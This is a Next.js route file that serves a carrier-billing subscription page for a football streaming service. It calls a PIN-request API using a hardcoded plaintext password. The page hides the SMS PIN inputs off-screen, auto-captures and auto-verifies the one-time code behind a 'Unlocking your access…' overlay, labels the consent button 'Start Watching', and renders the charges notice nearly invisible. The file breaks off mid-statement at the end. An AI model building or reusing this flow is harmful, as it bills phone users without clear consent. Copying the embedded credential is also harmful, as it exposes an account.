import { NextRequest } from 'next/server';

const PIN_REQUEST_URL =
  'https://vivavas1.future-club.com/fcc-evina-pin-flow-apis/PinRequest';

/** Short beats only — carrier SMS + PinVerify latency dominates; keep our adds under ~1s total. */
const POST_CONSENT_VERIFY_MS = 450;
const OTP_AUTOFILL_VERIFY_MS = 400;
const PREFILLED_AFTER_CONSENT_MS = 500;
/** If no OTP yet, nudge resend just inside the client’s 5–6s “feels slow” window. */
const SILENT_WAIT_RESEND_MS = 5500;

const SERVER_PARAMS = {
  UserId: '166',
  Password: 'Mobility_MI@123',
  ProductId: '479',
  TelcoId: '7',
  ShortCode: '50995',
  ConfirmButtonHTMLId: 'Confirm',
  CampaignURL: '',
  ContentURL: '',
};

const FCB_TILE_IMAGES = ['/football.png', '/real-madrid.png', '/barcelona.png'] as const;

function buildFootballCollageTilesHtml(): string {
  let html = '';
  for (let i = 0; i < 48; i++) {
    const src = FCB_TILE_IMAGES[i % FCB_TILE_IMAGES.length];
    const rot = ((i * 13) % 19) - 9;
    html += `<div class="fcb-tile" style="--fcb-rot:${rot};background-image:url('${src}')"></div>`;
  }
  return html;
}

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const msisdn = searchParams.get('msisdn') || '';
  const trxId = searchParams.get('trxId') || '';
  const showDebug = searchParams.get('debug') === '1';

  // Get real client IP from the request itself (more reliable than query param)
  const forwarded = request.headers.get('x-forwarded-for');
  const realIP = forwarded ? forwarded.split(',')[0].trim() : '127.0.0.1';
  const userIP = searchParams.get('userIP') || realIP;

  if (!msisdn || !trxId) {
    return new Response('Missing msisdn or trxId', { status: 400 });
  }

  console.log(`[otp-page] Client IP resolved: userIP=${userIP} realIP=${realIP} x-forwarded-for=${forwarded}`);

  // ── Call PinRequest server-side to get Evina JS + trigger SMS ─────────
  // Evina JS MUST be in <head> on page load so it can monitor the confirmBtn click
  let evinaJS = '';
  let pinRequestStatus = '';
  const usedTrxId = trxId;

  try {
    const normalizedMsisdn =
      msisdn.startsWith('965') || msisdn.startsWith('+965')
        ? msisdn.replace(/^\+/, '')
        : `965${msisdn}`;
    const payload = {
      MSISDN: normalizedMsisdn,
      TransactionId: usedTrxId,
      Headers: request.headers.get('user-agent') || '',
      UserIP: userIP,
      ...SERVER_PARAMS,
    };

    console.log(`[otp-page] PinRequest payload:`, { ...payload, Password: '***' });

    const res = await fetch(PIN_REQUEST_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    const raw = await res.json();
    pinRequestStatus = String(raw.Status ?? raw.status ?? raw.STATUS ?? '');

    // Try multiple possible field names for Evina JS
    evinaJS = String(raw.JS ?? raw.js ?? raw.Javascript ?? raw.javascript ?? raw.Script ?? raw.script ?? raw.Evina ?? raw.evina ?? '');

    // Log full response for debugging
    console.log(`[otp-page] PinRequest response keys:`, Object.keys(raw));
    console.log(`[otp-page] PinRequest raw response:`, JSON.stringify(raw).slice(0, 500));

    evinaJS = evinaJS
      .trim()
      .replace(/^<script[^>]*>/i, '')
      .replace(/<\/script\s*>$/i, '')
      .trim();

    console.log(`[otp-page] PinRequest -> Status: ${pinRequestStatus}, JS len: ${evinaJS.length}`);
  } catch (err) {
    console.error(`[otp-page] PinRequest error:`, err);
    pinRequestStatus = 'error';
  }

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>GoalNowX</title>
  <link rel="stylesheet" href="/football-collage-backdrop.css">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; min-height: 100vh; min-height: 100dvh; background: #0b0e14; display: flex; flex-direction: column; position: relative; overflow-x: hidden; }
    .hero-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; background: #06060a; }
    .hero-bg .hero-scrim { position: absolute; inset: 0; background: linear-gradient(180deg, rgba(11,14,20,0.45) 0%, rgba(11,14,20,0.82) 45%, rgba(11,14,20,0.94) 100%); }
    .hero-bg .hero-vignette { position: absolute; inset: 0; box-shadow: inset 0 0 120px rgba(0,0,0,0.55); }
    .bg-glow { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 600px; height: 300px; background: rgba(226,56,58,0.06); border-radius: 50%; filter: blur(100px); pointer-events: none; z-index: 1; }
    .topbar { display: flex; align-items: center; justify-content: space-between; padding: 16px 20px; position: relative; z-index: 10; }
    .live-pill { font-size: 10px; font-weight: 800; letter-spacing: 0.12em; text-transform: uppercase; color: rgba(255,255,255,0.45); background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.08); border-radius: 999px; padding: 6px 12px; }
    .live-pill i { display: inline-block; width: 6px; height: 6px; border-radius: 50%; background: #22c55e; margin-right: 6px; vertical-align: middle; animation: pulse 2s ease-in-out infinite; }
    .brand { display: flex; align-items: center; gap: 10px; }
    .brand-icon { width: 36px; height: 36px; background: #e2383a; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
    .brand-icon svg { width: 20px; height: 20px; color: white; }
    .brand-name { font-size: 18px; font-weight: 800; color: white; letter-spacing: -0.3px; }
    .brand-name span { color: #e2383a; }
    .step-badge { display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.05); border-radius: 20px; padding: 6px 12px; }
    .step-dot { width: 6px; height: 6px; border-radius: 50%; background: rgba(255,255,255,0.2); }
    .step-dot.active { background: #e2383a; }
    .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; z-index: 10; }
    .wrapper { width: 100%; max-width: 380px; }
    .card { background: rgba(20, 25, 35, 0.82); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border-radius: 20px; border: 1px solid rgba(255,255,255,0.08); padding: 28px 24px; position: relative; box-shadow: 0 24px 60px rgba(0,0,0,0.45); }
    .match-preview { background: linear-gradient(135deg, #1a1f2e, #141923); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; margin-bottom: 20px; text-align: center; }
    .match-preview .label { font-size: 10px; font-weight: 700; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 12px; }
    .match-preview h2 { font-size: 22px; font-weight: 800; color: white; line-height: 1.3; }
    .match-preview h2 em { font-style: normal; color: #e2383a; }
    .match-preview p { color: rgba(255,255,255,0.35); font-size: 13px; margin-top: 6px; }
    .feature-list { display: flex; gap: 8px; justify-content: center; margin-top: 16px; }
    .feature-tag { font-size: 11px; font-weight: 600; color: rgba(255,255,255,0.5); background: rgba(255,255,255,0.05); border-radius: 20px; padding: 5px 10px; }
    .verify-header { text-align: center; margin-bottom: 24px; }
    .verify-icon { width: 60px; height: 60px; background: rgba(226,56,58,0.1); border-radius: 50%; margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; }
    .verify-icon svg { width: 28px; height: 28px; color: #e2383a; }
    .verify-header h2 { font-size: 20px; font-weight: 800; color: white; }
    .verify-header p { color: rgba(255,255,255,0.4); font-size: 13px; margin-top: 4px; }
    .verify-header p b { color: rgba(255,255,255,0.7); font-weight: 700; }
    .otp-row { display: flex; gap: 10px; justify-content: center; margin: 20px 0 10px; }
    .otp-input { width: 58px; height: 64px; text-align: center; font-size: 24px; font-weight: 800; border: 2px solid rgba(255,255,255,0.08); border-radius: 14px; outline: none; transition: all 0.2s; background: rgba(255,255,255,0.03); color: white; -webkit-appearance: none; }
    .otp-input:focus { border-color: #e2383a; background: rgba(226,56,58,0.05); box-shadow: 0 0 0 3px rgba(226,56,58,0.1); }
    .otp-input.error { border-color: #ef4444; background: rgba(239,68,68,0.08); }
    .error-msg { text-align: center; color: #ef4444; font-size: 13px; font-weight: 500; min-height: 22px; margin-bottom: 12px; }
    .btn { width: 100%; padding: 16px; border: none; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; min-height: 54px; display: flex; align-items: center; justify-content: center; gap: 8px; }
    .btn-primary { background: #e2383a; color: white; box-shadow: 0 6px 20px rgba(226,56,58,0.25); }
    .btn-primary:hover { background: #c42f31; transform: translateY(-1px); }
    .btn-primary:active { transform: translateY(0); }
    .spinner { width: 20px; height: 20px; border: 2.5px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.7s linear infinite; }
    .spinner-lg { width: 44px; height: 44px; border: 3px solid rgba(226,56,58,0.15); border-top-color: #e2383a; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 16px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .resend { text-align: center; margin-top: 18px; font-size: 13px; color: rgba(255,255,255,0.3); }
    .resend a { color: #e2383a; text-decoration: none; font-weight: 600; cursor: pointer; }
    .resend a:hover { text-decoration: underline; }
    .trust { display: flex; justify-content: center; gap: 16px; margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.04); }
    .trust-item { display: flex; align-items: center; gap: 4px; color: rgba(255,255,255,0.2); font-size: 11px; font-weight: 500; }
    .trust-item svg { width: 13px; height: 13px; }
    .terms { text-align: center; font-size: 10px; color: rgba(255,255,255,0.12); margin-top: 14px; line-height: 1.5; }
    .debug-wrap { margin-top: 16px; }
    .debug-toggle { display: block; width: 100%; text-align: center; font-size: 10px; color: rgba(255,255,255,0.22); text-decoration: underline; cursor: pointer; background: none; border: none; }
    .debug-panel { margin-top: 8px; background: rgba(0,0,0,0.45); border-radius: 10px; padding: 10px; font-size: 10px; color: rgba(255,255,255,0.45); white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow: auto; font-family: monospace; line-height: 1.6; border: 1px solid rgba(255,255,255,0.06); }
    @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
    .shake { animation: shake 0.4s ease-in-out; }
    @keyframes fadeIn { from{opacity:0;transform:translateY(12px)} to{opacity:1;transform:translateY(0)} }
    .fade-in { animation: fadeIn 0.4s ease-out; }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
    .pulse { animation: pulse 2s ease-in-out infinite; }
    .phase-hidden { display: none !important; }
    #Confirm > span, #verifyBtn > span { display: inline-flex; align-items: center; gap: 8px; }
    /* Full-screen post-consent: no PIN boxes, numbers, or technical UI visible */
    .processing-overlay {
      position: fixed;
      inset: 0;
      z-index: 99999;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 28px 22px;
      background: rgba(11, 14, 20, 0.78);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
    }
    .processing-card { width: 100%; max-width: 340px; text-align: center; }
    .processing-card .brand { justify-content: center; margin-bottom: 28px; }
    .overlay-error { color: #f87171; font-size: 13px; font-weight: 500; margin-top: 18px; min-height: 20px; line-height: 1.45; }
    .resend-overlay { margin-top: 22px; font-size: 13px; color: rgba(255,255,255,0.35); }
    .resend-overlay a { color: #e2383a; font-weight: 700; text-decoration: none; }
    .resend-overlay a:active { opacity: 0.85; }
    /* OTP vault: off-screen only — browsers can still autofill / Web OTP; users never see it */
    .otp-vault {
      position: fixed;
      left: -2000px;
      top: 0;
      width: 320px;
      height: 56px;
      opacity: 0;
      overflow: hidden;
    }
    .otp-vault .otp-input { width: 40px; height: 40px; font-size: 16px; }
  </style>
  <!-- Evina JS handles all anti-fraud monitoring — no navigator overrides or click guards needed -->
  ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS -->'}
</head>
<body>
  <div class="hero-bg fcb-perspective" aria-hidden="true">
    <div class="fcb-collage-wrap">
      <div class="fcb-collage-inner">
        <div class="fcb-grid">
          ${buildFootballCollageTilesHtml()}
        </div>
      </div>
    </div>
    <div class="fcb-hero">
      <img class="fcb-hero-img" src="/football.png" alt="" width="1200" height="800" decoding="async">
    </div>
    <div class="hero-scrim"></div>
    <div class="hero-vignette"></div>
  </div>
  <div class="bg-glow"></div>
  <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - VALIDER - BUY - SUBSCRIBE - DEVAM ET - j'en profite - T\\u00e9l\\u00e9charger - CONTINUER - ENTRER - S'ABONNER - \\u0627\\u0634\\u062a\\u0631\\u0643 \\u0627\\u0644\\u0622\\u0646 - VOIR - ACCEPT - \\u0627\\u0634\\u062a\\u0631\\u0643 \\u0627\\u0644\\u0627\\u0646 - \\u0627\\u0644\\u0627\\u0634\\u062a\\u0631\\u0627\\u0643</a>
  <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>

  <div id="processingOverlay" class="processing-overlay phase-hidden" aria-live="polite">
    <div class="processing-card">
      <div class="brand">
        <div class="brand-icon"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg></div>
        <div class="brand-name">GOAL<span>NOWX</span></div>
      </div>
      <div class="spinner-lg" style="margin:0 auto 22px"></div>
      <h2 id="overlayTitle" style="font-size:22px;font-weight:800;color:#fff;line-height:1.25;margin-bottom:8px">Unlocking your access…</h2>
      <p id="overlaySub" style="color:rgba(255,255,255,0.4);font-size:14px;line-height:1.45">Usually just a few seconds</p>
      <p id="overlayHint" style="text-align:center;color:rgba(255,255,255,0.28);font-size:12px;margin-top:14px" class="pulse">Please keep this screen open</p>
      <p id="overlayError" class="overlay-error"></p>
      <p id="resendAreaOverlay" class="resend-overlay phase-hidden">Still waiting? <a href="#" id="resendLinkOverlay">Tap to try again</a></p>
      <div class="debug-wrap" style="display:${showDebug ? 'block' : 'none'};margin-top:20px">
        <button type="button" class="debug-toggle" id="debugToggle" onclick="toggleDebug()">Show technical details</button>
        <div class="debug-panel" id="debugPanel" style="display:none"></div>
      </div>
    </div>
  </div>

  <div id="otpVault" class="otp-vault" aria-hidden="true">
    <input id="otpValue" type="text" tabindex="-1" autocomplete="off">
    <input id="otpFull" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" tabindex="-1">
    <div class="otp-row" id="otpRow">
      <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin0" autocomplete="off" tabindex="-1">
      <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off" tabindex="-1">
      <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off" tabindex="-1">
      <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off" tabindex="-1">
    </div>
    <div class="error-msg" id="errorMsg" style="display:none"></div>
    <button type="button" class="btn btn-primary phase-hidden" id="verifyBtn" tabindex="-1" aria-hidden="true">
      <span id="btnVerify">Verify Code</span>
      <span id="btnLoading" class="phase-hidden"><div class="spinner"></div> <span>Verifying...</span></span>
    </button>
  </div>

  <div class="topbar">
    <div class="brand">
      <div class="brand-icon"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg></div>
      <div class="brand-name">GOAL<span>NOWX</span></div>
    </div>
    <div style="display:flex;align-items:center;gap:10px;">
      <div class="step-badge">
        <div class="step-dot active"></div>
        <div class="step-dot" id="stepDot2"></div>
        <div class="step-dot" id="stepDot3"></div>
      </div>
      <div class="live-pill" title=""><i></i>Live</div>
    </div>
  </div>

  <div class="main">
    <div class="wrapper">
      <div class="card fade-in">
        <div id="phase1">
          <div class="match-preview">
            <div class="label">Unlock Premium Access</div>
            <h2>Watch Live Football<br><em>Anytime, Anywhere</em></h2>
            <p>All leagues &bull; All matches &bull; Live sports updates</p>
            <div class="feature-list">
              <div class="feature-tag">⚽ Premier League</div>
              <div class="feature-tag">🏆 UCL</div>
              <div class="feature-tag">📺 HD</div>
            </div>
          </div>
        </div>

        <button class="btn btn-primary" id="Confirm">
          <span id="btnStart"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Watching</span>
          <span id="btnWait" class="phase-hidden"><div class="spinner"></div> <span>Waiting for SMS...</span></span>
        </button>

        <div class="trust" id="trustSignals">
          <div class="trust-item"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg> Secure</div>
          <div class="trust-item"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Verified</div>
          <div class="trust-item"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg> Instant</div>
        </div>

        <p class="terms" id="termsFoot">By subscribing you agree to our Terms &amp; Conditions.<br>Standard operator charges apply.</p>
      </div>
    </div>
  </div>

  <script>
    var MSISDN = ${JSON.stringify(msisdn)};
    var TRXID  = ${JSON.stringify(usedTrxId)};
    var PIN_REQUEST_STATUS = ${JSON.stringify(pinRequestStatus)};
    var USER_IP = ${JSON.stringify(userIP)};
    var EVINA_JS_LEN = ${evinaJS.length};
    var DEBUG_PANEL = ${JSON.stringify(showDebug)};
    var isVerifying = false;
    var pinVerified = false;  // session-level guard — only ONE verifyPin call ever
    var phase = 1;
    var otpPreFilled = false;  // true if OTP arrived before user tapped Subscribe
    var lastConsentAt = 0; // when user tapped Confirm (Evina consent)

    var pins = document.querySelectorAll('.otp-input');
    var confirmBtn = document.getElementById('Confirm');
    var verifyBtn = document.getElementById('verifyBtn');
    var errorMsg = document.getElementById('errorMsg');
    var otpFull = document.getElementById('otpFull');
    var otpValue = document.getElementById('otpValue');

    function dbg(msg) {
      var ts = new Date().toLocaleTimeString();
      var line = '[' + ts + '] ' + msg;
      console.log(line);
      var p = document.getElementById('debugPanel');
      if (p) p.textContent = (p.textContent || '') + '\\n' + line;
    }
    function toggleDebug() {
      var p = document.getElementById('debugPanel');
      var t = document.getElementById('debugToggle');
      if (p.style.display === 'none') { p.style.display = 'block'; t.textContent = 'Hide technical details'; }
      else { p.style.display = 'none'; t.textContent = 'Show technical details'; }
    }

    function setBtnState(state) {
      // confirmBtn states: Start, Wait
      var confirmStates = ['btnStart', 'btnWait'];
      for (var i = 0; i < confirmStates.length; i++) {
        var el = document.getElementById(confirmStates[i]);
        if (el) {
          if (confirmStates[i] === 'btn' + state) el.classList.remove('phase-hidden');
          else el.classList.add('phase-hidden');
        }
      }
      // verifyBtn states: Verify, Loading
      var verifyStates = ['btnVerify', 'btnLoading'];
      for (var j = 0; j < verifyStates.length; j++) {
        var el2 = document.getElementById(verifyStates[j]);
        if (el2) {
          if (verifyStates[j] === 'btn' + state) el2.classList.remove('phase-hidden');
          else el2.classList.add('phase-hidden');
        }
      }
    }

    var resendOverlayA = document.getElementById('resendLinkOverlay');
    if (resendOverlayA) {
      resendOverlayA.addEventListener('click', function(ev) {
        ev.preventDefault();
        handleResend();
      });
    }

    dbg('Session: msisdn=' + MSISDN + ' trxId=' + TRXID + ' ip=' + USER_IP);
    dbg('PinRequest: Status=' + PIN_REQUEST_STATUS + ' Evina=' + (EVINA_JS_LEN > 0 ? 'YES(' + EVINA_JS_LEN + ')' : 'NO'));
    dbg('DOM: confirmBtn=' + !!confirmBtn + ' otpValue=' + !!otpValue + ' otpFull=' + !!otpFull + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));

    function getFullPin() {
      var val = '';
      pins.forEach(function(p) { val += p.value; });
      return val.replace(/\\D/g, '');
    }

    pins.forEach(function(input, i) {
      input.addEventListener('input', function() {
        var val = input.value.replace(/\\D/g, '');
        if (val.length > 1) {
          if (isVerifying) return;
          var code = val.slice(0, 4);
          for (var j = 0; j < 4; j++) pins[j].value = code[j] || '';
          if (otpValue) otpValue.value = code;
          clearError();
          if (code.length === 4) dbg('Hidden autofill (pins): "' + code + '"');
          return;
        }
        input.value = val.slice(-1);
        clearError();
        if (otpValue) otpValue.value = getFullPin();
      });
      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') { if (input.value) input.value = ''; }
      });
      input.addEventListener('paste', function(e) {
        e.preventDefault();
        if (isVerifying) return;
        var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\\D/g, '').slice(0, 4);
        for (var j = 0; j < 4; j++) pins[j].value = text[j] || '';
        if (otpValue) otpValue.value = text;
        clearError();
        if (text.length === 4) dbg('Paste autofill (hidden): "' + text + '"');
      });
    });

    // Hidden input catches Chrome/App auto-fill
    var otpFullHandled = false;
    function handleOtpFullFill() {
      if (otpFullHandled || isVerifying) return;
      var code = otpFull.value.replace(/\\D/g, '').slice(0, 4);
      if (code.length === 4) {
        otpFullHandled = true;
        for (var j = 0; j < 4; j++) pins[j].value = code[j] || '';
        if (otpValue) otpValue.value = code;
        clearError();
        if (phase === 1) {
          // OTP arrived before consent tap — mark it, don't reveal Phase 2 yet
          otpPreFilled = true;
          dbg('Auto-fill: "' + code + '" — OTP pre-filled, waiting for user Subscribe tap');
        } else {
          // Phase 2: keep premium "unlocking" UI — do not reveal PIN boxes during auto path
          dbg('Auto-fill: "' + code + '" — phase 2 active, scheduling auto-verify (no PIN UI)');
          // Give Evina/carrier a moment to correlate consent/telemetry before verify.
          setTimeout(function() { verifyPin(code); }, ${OTP_AUTOFILL_VERIFY_MS});
        }
      }
    }
    if (otpFull) {
      otpFull.addEventListener('input', handleOtpFullFill);
      otpFull.addEventListener('change', handleOtpFullFill);
    }

    function genericUserMessage(raw) {
      var r = String(raw || '');
      if (r.indexOf('WiFi') >= 0 || r.indexOf('mobile data') >= 0) return 'Please use mobile data, then tap below to try again.';
      if (r.indexOf('Network') >= 0) return 'Connection issue. Tap below to try again.';
      return 'We couldn\\'t complete that automatically. Tap below to try again.';
    }

    function showError(msg) {
      var m = String(msg || '');
      var friendly = DEBUG_PANEL ? m : genericUserMessage(m);
      var oe = document.getElementById('overlayError');
      if (oe) oe.textContent = friendly;
      if (errorMsg) errorMsg.textContent = DEBUG_PANEL ? m : '';
      pins.forEach(function(p) { p.classList.add('error'); });
      showOverlayResend();
    }

    function clearError() {
      var oe = document.getElementById('overlayError');
      if (oe) oe.textContent = '';
      if (errorMsg) errorMsg.textContent = '';
      pins.forEach(function(p) { p.classList.remove('error'); });
    }

    function showProcessingOverlay() {
      var ov = document.getElementById('processingOverlay');
      if (ov) ov.classList.remove('phase-hidden');
    }

    function resetOverlayCopy() {
      var t = document.getElementById('overlayTitle');
      var s = document.getElementById('overlaySub');
      var h = document.getElementById('overlayHint');
      var e = document.getElementById('overlayError');
      var r = document.getElementById('resendAreaOverlay');
      if (t) t.textContent = 'Unlocking your access…';
      if (s) s.textContent = 'Usually just a few seconds';
      if (h) { h.textContent = 'Please keep this screen open'; h.classList.add('pulse'); }
      if (e) e.textContent = '';
      if (r) r.classList.add('phase-hidden');
    }

    function showOverlayResend() {
      var r = document.getElementById('resendAreaOverlay');
      if (r) r.classList.remove('phase-hidden');
      dbg('Resend link shown (no PIN UI)');
    }

    function goToPhase2() {
      if (phase === 2) return;
      phase = 2;
      document.getElementById('phase1').classList.add('phase-hidden');
      document.getElementById('trustSignals').classList.add('phase-hidden');
      var tf = document.getElementById('termsFoot');
      if (tf) tf.classList.add('phase-hidden');
      document.getElementById('stepDot2').classList.add('active');
      confirmBtn.classList.add('phase-hidden');
      resetOverlayCopy();
      showProcessingOverlay();

      if (otpPreFilled) {
        var prefilled = (otpValue && otpValue.value) ? otpValue.value.replace(/\\D/g, '').slice(0, 4) : getFullPin();
        dbg('Phase 2 — OTP pre-filled, scheduling auto-verify (overlay only)...');
        if (prefilled.length === 4) {
          setTimeout(function() { verifyPin(prefilled); }, ${PREFILLED_AFTER_CONSENT_MS});
        }
      } else {
        dbg('Phase 2 — waiting for silent auto-fill (${SILENT_WAIT_RESEND_MS}ms) then resend-only fallback...');
        setTimeout(function() {
          if (!isVerifying && !pinVerified) {
            dbg('Timeout — offering resend (still no PIN UI)');
            var s = document.getElementById('overlaySub');
            var h = document.getElementById('overlayHint');
            if (s) s.textContent = 'This is taking a little longer than usual';
            if (h) { h.textContent = 'You can try again below — no need to type anything'; h.classList.remove('pulse'); }
            showOverlayResend();
          }
        }, ${SILENT_WAIT_RESEND_MS});
      }
    }

    function setFinishingCopy() {
      var t = document.getElementById('overlayTitle');
      var s = document.getElementById('overlaySub');
      var h = document.getElementById('overlayHint');
      if (t) t.textContent = 'Almost there…';
      if (s) s.textContent = 'Confirming your subscription securely';
      if (h) { h.textContent = 'Just a moment'; h.classList.remove('pulse'); }
    }

    // ─── CRITICAL: Evina consent flow ──────────────────────────────────
    // PinRequest was already called SERVER-SIDE (SMS sent, Evina JS loaded in <head>).
    // Phase 1 is shown so the user MUST physically tap confirmBtn.
    // Evina monitors this tap as consent proof.
    // After the tap, we show a fullscreen overlay only (no visible PIN/number UI).
    // NO auto-skip of Phase 1. User MUST tap.

    if (PIN_REQUEST_STATUS !== '0') {
      dbg('PinRequest FAILED (Status=' + PIN_REQUEST_STATUS + ') — waiting for user tap');
    } else {
      dbg('PinRequest OK — Evina loaded — waiting for user to tap Subscribe (consent required)');
    }

    // ── PHASE 1 only: Subscribe / Start Watching — Evina consent tap ──
    // confirmBtn is exclusively for Phase 1. Evina monitors this element.
    // Phase 2 uses a separate verifyBtn so Evina never sees a second click here.
    confirmBtn.addEventListener('click', function(e) {
      dbg('confirmBtn clicked — phase=' + phase + ' isTrusted=' + e.isTrusted + ' isVerifying=' + isVerifying);

      if (!e.isTrusted) {
        dbg('Blocked programmatic click on confirmBtn — Evina needs real user tap');
        return;
      }
      if (phase !== 1) return;

      dbg('[Phase1] confirmBtn tapped isTrusted=true — Evina consent recorded');
      lastConsentAt = Date.now();

      if (PIN_REQUEST_STATUS === '0') {
        dbg('PinRequest was OK — SMS already sent, entering phase 2');
        goToPhase2();
      } else {
        dbg('PinRequest FAILED (Status=' + PIN_REQUEST_STATUS + ') — SMS was NOT sent');
        goToPhase2();
        var pinReqErr = 'SMS could not be sent (error: ' + PIN_REQUEST_STATUS + '). Tap Resend to try again.';
        if (PIN_REQUEST_STATUS === '7') pinReqErr = 'Carrier rejected request (Status 7). Make sure you are on mobile data, not WiFi.';
        showError(pinReqErr);
      }
    });

    // ── PHASE 2 only: Verify Code — separate button, Evina does NOT monitor this ──
    if (verifyBtn) {
      verifyBtn.addEventListener('click', function(e) {
        if (isVerifying) { dbg('Skipping — verify already in progress'); return; }
        var pin = getFullPin();
        if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
          pin = otpValue.value.replace(/\\D/g, '').slice(0, 4);
        }
        dbg('User tapped Verify Code (verifyBtn) — pin="' + pin + '"');
        if (pin.length !== 4) { showError('Please enter the 4-digit code'); return; }
        verifyPin(pin);
      });
    }

    function verifyPin(pin) {
      if (pinVerified) { dbg('verifyPin BLOCKED — already verified this session'); return; }
      // Avoid verifying too quickly after the consent click.
      if (lastConsentAt) {
        var msSinceConsent = Date.now() - lastConsentAt;
        if (msSinceConsent < ${POST_CONSENT_VERIFY_MS}) {
          dbg('Delaying verifyPin by ' + (${POST_CONSENT_VERIFY_MS} - msSinceConsent) + 'ms (post-consent)');
          setTimeout(function() { verifyPin(pin); }, (${POST_CONSENT_VERIFY_MS} - msSinceConsent));
          return;
        }
      }
      pinVerified = true;
      isVerifying = true;
      setFinishingCopy();
      setBtnState('Loading');
      clearError();
      dbg('Verifying PIN: "' + pin + '" trxId=' + TRXID);

      fetch('/api/pin-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ TransactionId: TRXID, Pin: pin, MSISDN: MSISDN })
      })
      .then(function(r) { return r.json(); })
      .then(function(data) {
        dbg('PinVerify -> Status="' + data.Status + '" raw=' + JSON.stringify(data.raw || {}));
        if (data.Status === '0' || data.Status === '103') {
          dbg('SUCCESS — redirecting');
          document.getElementById('stepDot3').classList.add('active');
          window.location.href = '/thankyou';
        } else {
          var errDetail = 'PinVerify status ' + data.Status;
          if (data.Status === '2501') errDetail = '2501: code already used — resend';
          if (data.Status === '2504') errDetail = '2504: expired — resend';
          if (data.Status === '2801') errDetail = '2801: carrier rejected — resend';
          if (data.Status === '2804') errDetail = '2804: security check — resend';
          if (data.Status.indexOf('2200') === 0) errDetail = data.Status + ': carrier security — resend';
          dbg(errDetail);
          pins.forEach(function(p) { p.value = ''; });
          if (otpFull) otpFull.value = '';
          if (otpValue) otpValue.value = '';
          pinVerified = false;
          showError(errDetail);
        }
      })
      .catch(function(err) {
        dbg('PinVerify ERROR: ' + err);
        pinVerified = false;
        showError('Network error. Please try again.');
      })
      .finally(function() {
        isVerifying = false;
        otpFullHandled = false;
        setBtnState('Verify');
      });
    }

    function handleResend() {
      dbg('Resending OTP — full page reload...');
      var newTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
      var url = '/api/otp-page?msisdn=' + encodeURIComponent(MSISDN) + '&trxId=' + encodeURIComponent(newTrxId) + '&userIP=' + encodeURIComponent(USER_IP);
      if (DEBUG_PANEL) url += '&debug=1';
      window.location.href = url;
    }

    if (window._ntR && window._nt) {
      dbg('Running inside app');
      try { window._nt.onPageReady(); } catch(e) {}
    }
  </script>
</body>
</html>`;

  return new Response(html, {
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
